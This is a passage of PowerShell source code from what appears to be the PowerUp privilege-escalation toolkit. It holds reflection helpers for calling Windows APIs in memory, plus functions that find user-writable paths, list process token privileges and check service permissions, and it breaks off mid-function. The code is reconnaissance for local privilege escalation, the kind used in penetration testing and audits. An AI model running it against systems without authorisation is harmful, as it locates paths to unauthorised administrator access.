function New-InMemoryModule {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()
    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }
    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
    return $ModuleBuilder
}
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [String]
        $EntryPoint,
        [Switch]
        $SetLastError
    )
    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }
    New-Object PSObject -Property $Properties
}
function Add-Win32Type
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $TypeHash = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }
                $i++
            }
            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))
            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }
        $ReturnTypes = @{}
        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()
            $ReturnTypes[$Key] = $Type
        }
        return $ReturnTypes
    }
}
function psenum {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    $EnumType = $Type -as [Type]
    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)
    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }
    foreach ($Key in $EnumElements.Keys)
    {
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }
    $EnumBuilder.CreateType()
}
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}
function struct
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,
        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $ExplicitLayout
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $Fields = New-Object Hashtable[]($StructFields.Count)
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }
    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']
        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']
        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')
        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            $NewField.SetCustomAttribute($AttribBuilder)
        }
        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
    $StructBuilder.CreateType()
}
function Get-ModifiablePath {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiablePath')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Alias('LiteralPaths')]
        [Switch]
        $Literal
    )
    BEGIN {
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }
        $MAccessMask = 0x520d0006
        $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")
        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value
        $TranslatedIdentityReferences = @{}
    }
    PROCESS {
        ForEach($TargetPath in $Path) {
            $CandidatePaths = @()
            if ($PSBoundParameters['Literal']) {
                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))
                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    $ParentPath = Split-Path -Path $TempPath -Parent  -ErrorAction SilentlyContinue
                    if ($ParentPath -and (Test-Path -Path $ParentPath)) {
                        $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                    } else {
                        Write-Verbose "Skipping: $TempPath [Not Found]"
                    }
                }
            }
            else {
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {
                        if (($SeparationCharacterSet -notmatch ' ')) {
                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()
                            if ($TempPath -and ($TempPath -ne '')) {
                                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                }
                                else {
                                    try {
                                        $ParentPath = (Split-Path -Path $TempPath -Parent -ErrorAction SilentlyContinue).Trim()
                                        if ($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath  -ErrorAction SilentlyContinue)) {
                                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {}
                                }
                            }
                        }
                        else {
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }
            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                $CandidatePath = $_
                try {
                    $Acl = Get-Acl -Path $CandidatePath -ErrorAction Stop
                    $Owner = $Acl.Owner;
                    if( $Owner -notmatch '^S-1-5.*' ) {
                        if( -not $TranslatedIdentityReferences[$Owner] ) {
                            $IdentityUser = New-Object System.Security.Principal.NTAccount($Owner)
                            $TranslatedIdentityReferences[$Owner] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                        }
                        $IdentitySID = $TranslatedIdentityReferences[$Owner]
                    } else {
                        $IdentitySID = $Owner
                    }
                    if( $CurrentUserSids -contains $IdentitySID ) {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                        $out | Add-Member Noteproperty 'Owner' $Owner
                        $Out | Add-Member Noteproperty 'IdentityReference' $Owner
                        $Out | Add-Member Noteproperty 'Permissions' @('Owner')
                        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                        $Out
                    }
                } catch [System.UnauthorizedAccessException] {
                    Write-Verbose "Skipping: $CandidatePath [Access Denied]"
                    continue
                }
                $Acl | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
                    $FileSystemRights = $_.FileSystemRights.value__
                    if( $FileSystemRights -band $MAccessMask )  {
                        $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }
                        $IdentityRef = $_.IdentityReference
                        if ($IdentityRef -notmatch '^S-1-5.*') {
                            if (-not ($TranslatedIdentityReferences[$IdentityRef])) {
                                $IdentityUser = New-Object System.Security.Principal.NTAccount($IdentityRef)
                                try {
                                    $TranslatedIdentityReferences[$IdentityRef] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                                } catch {
                                    $TranslatedIdentityReferences[$IdentityRef] = $IdentityUser
                                }
                            }
                            $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                        }
                        else {
                            $IdentitySID = $_.IdentityReference
                        }
                        if ($CurrentUserSids -contains $IdentitySID) {
                            $Out = New-Object PSObject
                            $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                            $out | Add-Member Noteproperty 'Owner' $Owner
                            $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                            $Out | Add-Member Noteproperty 'Permissions' $Permissions
                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                            $Out
                        }
                    }
                }
            }
        }
    }
}
function Get-TokenInformation {
    [OutputType('PowerUp.TokenGroup')]
    [OutputType('PowerUp.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [Alias('hToken', 'Token')]
        [ValidateNotNullOrEmpty()]
        [IntPtr]
        $TokenHandle,
        [String[]]
        [ValidateSet('Groups', 'Privileges', 'Type')]
        $InformationClass = 'Privileges'
    )
    PROCESS {
        if ($InformationClass -eq 'Groups') {
            $TokenGroupsPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 2, 0, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize)
            [IntPtr]$TokenGroupsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenGroupsPtrSize)
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                $TokenGroups = $TokenGroupsPtr -as $TOKEN_GROUPS
                For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                    if ($TokenGroups.Groups[$i].SID) {
                        $SidString = ''
                        $Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($Result -eq 0) {
                            Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $GroupSid = New-Object PSObject
                            $GroupSid | Add-Member Noteproperty 'SID' $SidString
                            $GroupSid | Add-Member Noteproperty 'Attributes' ($TokenGroups.Groups[$i].Attributes -as $SidAttributes)
                            $GroupSid | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                            $GroupSid.PSObject.TypeNames.Insert(0, 'PowerUp.TokenGroup')
                            $GroupSid
                        }
                    }
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenGroupsPtr)
        }
        elseif ($InformationClass -eq 'Privileges') {
            $TokenPrivilegesPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 3, 0, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize)
            [IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesPtrSize)
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 3, $TokenPrivilegesPtr, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                $TokenPrivileges = $TokenPrivilegesPtr -as $TOKEN_PRIVILEGES
                For ($i=0; $i -lt $TokenPrivileges.PrivilegeCount; $i++) {
                    $Privilege = New-Object PSObject
                    $Privilege | Add-Member Noteproperty 'Privilege' $TokenPrivileges.Privileges[$i].Luid.LowPart.ToString()
                    $Privilege | Add-Member Noteproperty 'Attributes' ($TokenPrivileges.Privileges[$i].Attributes -as $LuidAttributes)
                    $Privilege | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                    $Privilege.PSObject.TypeNames.Insert(0, 'PowerUp.TokenPrivilege')
                    $Privilege
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
        }
        else {
            $TokenResult = New-Object PSObject
            $TokenTypePtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenTypePtrSize, [ref]$TokenTypePtrSize)
            [IntPtr]$TokenTypePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypePtrSize)
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, $TokenTypePtr, $TokenTypePtrSize, [ref]$TokenTypePtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                $Temp = $TokenTypePtr -as $TOKEN_TYPE
                $TokenResult | Add-Member Noteproperty 'Type' $Temp.Type
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)
            $TokenImpersonationLevelPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenImpersonationLevelPtrSize, [ref]$TokenImpersonationLevelPtrSize)
            [IntPtr]$TokenImpersonationLevelPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenImpersonationLevelPtrSize)
            $Success2 = $Advapi32::GetTokenInformation($TokenHandle, 8, $TokenImpersonationLevelPtr, $TokenImpersonationLevelPtrSize, [ref]$TokenImpersonationLevelPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success2) {
                $Temp = $TokenImpersonationLevelPtr -as $IMPERSONATION_LEVEL
                $TokenResult | Add-Member Noteproperty 'ImpersonationLevel' $Temp.ImpersonationLevel
                $TokenResult | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                $TokenResult.PSObject.TypeNames.Insert(0, 'PowerUp.TokenType')
                $TokenResult
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenImpersonationLevelPtr)
        }
    }
}
function Get-ProcessTokenGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id
    )
    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }
        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                $TokenGroups = Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Groups'
                $TokenGroups | ForEach-Object {
                    $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                    $_
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            if ($PSBoundParameters['Id']) {
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}
function Get-ProcessTokenPrivilege {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id,
        [Switch]
        [Alias('Privileged')]
        $Special
    )
    BEGIN {
        $SpecialPrivileges = @('SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeDebugPrivilege', 'SeSystemEnvironmentPrivilege', 'SeImpersonatePrivilege', 'SeTcbPrivilege')
    }
    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }
        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Privileges' | ForEach-Object {
                    if ($PSBoundParameters['Special']) {
                        if ($SpecialPrivileges -Contains $_.Privilege) {
                            $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                            $_ | Add-Member Aliasproperty Name ProcessId
                            $_
                        }
                    }
                    else {
                        $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                        $_
                    }
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            if ($PSBoundParameters['Id']) {
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}
function Get-ProcessTokenType {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenType')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id
    )
    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }
        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                $TokenType = Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Type'
                $TokenType | ForEach-Object {
                    $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                    $_
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            if ($PSBoundParameters['Id']) {
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}
function Test-ServiceDaclPermission {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.Service')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [PSObject[]]
        [ValidateNotNullOrEmpty()]
        $Services,
        [String[]]
        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead')]
        $Permissions,
        [String]
        [ValidateSet('ChangeConfig', 'Restart')]
        $PermissionSet = 'ChangeConfig'
    )
    BEGIN {
        $AccessMask = @{
            'QueryConfig'           = [uint32]'0x00000001'
            'ChangeConfig'          = [uint32]'0x00000002'
            'QueryStatus'           = [uint32]'0x00000004'
            'EnumerateDependents'   = [uint32]'0x00000008'
            'Start'                 = [uint32]'0x00000010'
            'Stop'                  = [uint32]'0x00000020'
            'PauseContinue'         = [uint32]'0x00000040'
            'Interrogate'           = [uint32]'0x00000080'
            'UserDefinedControl'    = [uint32]'0x00000100'
            'Delete'                = [uint32]'0x00010000'
            'ReadControl'           = [uint32]'0x00020000'
            'WriteDac'              = [uint32]'0x00040000'
            'WriteOwner'            = [uint32]'0x00080000'
            'Synchronize'           = [uint32]'0x00100000'
            'AccessSystemSecurity'  = [uint32]'0x01000000'
            'GenericAll'            = [uint32]'0x10000000'
            'GenericExecute'        = [uint32]'0x20000000'
            'GenericWrite'          = [uint32]'0x40000000'
            'GenericRead'           = [uint32]'0x80000000'
        }
        $CheckAllPermissionsInSet = $False
        if ($PSBoundParameters['Permissions']) {
            $TargetPermission = 0
            foreach($permission in $Permissions) {
                $TargetPermission = $TargetPermission -bxor $AccessMask[$Permission]
            }
        }
        else {
